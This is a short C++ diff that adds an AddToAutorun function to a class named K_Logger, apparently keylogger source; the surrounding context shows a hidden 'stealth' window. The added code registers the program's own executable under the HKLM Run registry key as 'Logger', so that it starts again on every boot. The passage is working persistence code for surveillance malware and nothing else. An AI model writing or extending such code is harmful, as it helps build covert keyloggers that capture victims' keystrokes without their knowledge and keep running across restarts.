@@ -808,6 +808,26 @@ void K_Logger::VisibilityApp()
 	ShowWindow(stealth, 1);
 }
 
+void K_Logger::AddToAutorun()
+{
+	HKEY registryKey;
+	char sizeReg[0x100];
+
+	GetModuleFileName(NULL, sizeReg, sizeof(sizeReg));
+	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+		"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+		NULL,
+		nullptr, 
+		REG_OPTION_NON_VOLATILE, 
+		KEY_SET_VALUE, nullptr, 
+		&registryKey, nullptr);
+
+	if (registryKey)
+	{
+		RegSetValueEx(registryKey, "Logger", NULL, REG_SZ, (LPBYTE)sizeReg, strlen(sizeReg));
+		RegCloseKey(registryKey);
+	}
+}
 
 int main()
 {
